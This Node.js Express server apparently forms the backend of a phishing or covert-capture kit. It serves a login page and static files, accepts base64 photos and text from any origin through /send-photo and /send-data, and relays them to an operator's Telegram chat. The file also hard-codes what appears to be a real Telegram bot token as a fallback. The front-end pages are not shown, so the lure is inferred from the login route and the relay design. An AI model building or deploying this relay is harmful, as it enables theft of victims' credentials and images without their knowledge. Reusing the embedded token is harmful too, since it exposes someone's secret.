const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');

const app = express();

// =======================
// 🔐 SECURITY / BODY PARSER FIX
// =======================
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// =======================
// 🌐 CORS
// =======================
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    next();
});

// =======================
// 📁 Static files
// =======================
app.use(express.static(path.join(__dirname)));

// ⚠️ الأفضل تخليه في ENV
const BOT_TOKEN = process.env.BOT_TOKEN || '8820755267:AAHMUktr3XDN_0RjFDM79NExy7ORssx-MdI';
const CHAT_ID = process.env.CHAT_ID || 'YOUR_CHAT_ID';

// =======================
// 🧪 Test route
// =======================
app.get('/test', (req, res) => {
    res.json({ ok: true, message: "Server is working" });
});

// =======================
// 📸 Send Photo
// =======================
app.post('/send-photo', async (req, res) => {
    try {
        console.log("📩 Incoming request received");

        const { image, caption, metadata } = req.body;

        if (!image) {
            return res.status(400).json({ error: 'No image provided' });
        }

        // إزالة base64 header
        const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'photo.jpg' });
        form.append('caption', caption || '📸 Image');

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            form,
            { headers: form.getHeaders() }
        );

        console.log("✅ Telegram response success");

        res.json({
            success: true,
            telegram: response.data
        });

    } catch (error) {
        console.error("❌ SEND PHOTO ERROR:");
        console.error(error.response?.data || error.message);

        res.status(500).json({
            success: false,
            error: error.response?.data || error.message
        });
    }
});

// =======================
// 💬 Send Text
// =======================
app.post('/send-data', async (req, res) => {
    try {
        console.log("📩 Text request:", req.body);

        const { caption } = req.body;

        if (!caption) {
            return res.status(400).json({ error: 'No caption provided' });
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: caption,
                parse_mode: 'HTML'
            }
        );

        res.json({
            success: true,
            telegram: response.data
        });

    } catch (error) {
        console.error("❌ SEND DATA ERROR:");
        console.error(error.response?.data || error.message);

        res.status(500).json({
            success: false,
            error: error.response?.data || error.message
        });
    }
});

// =======================
// 🏠 Home
// =======================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// =======================
// 🔐 Login page
// =======================
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// =======================
// 🚀 Start server
// =======================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});